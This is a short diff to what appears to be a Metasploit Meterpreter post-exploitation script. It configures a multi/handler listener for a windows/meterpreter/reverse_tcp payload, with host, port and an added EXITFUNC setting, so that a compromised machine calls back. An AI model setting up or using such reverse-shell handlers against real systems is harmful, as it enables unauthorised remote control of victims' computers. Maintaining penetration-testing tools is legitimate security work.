@@ -87,9 +87,10 @@ print_status("Agent executed with PID #{proc.pid}")
 #
 if(autoconn)
 	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
-	mul.datastore['LHOST']   = rhost
-	mul.datastore['LPORT']   = rport
+	mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
+	mul.datastore['LHOST']     = rhost
+	mul.datastore['LPORT']     = rport
+	mul.datastore['EXITFUNC']  = 'process'
 	mul.datastore['ExitOnSession'] = false
 
 	mul.exploit_simple(
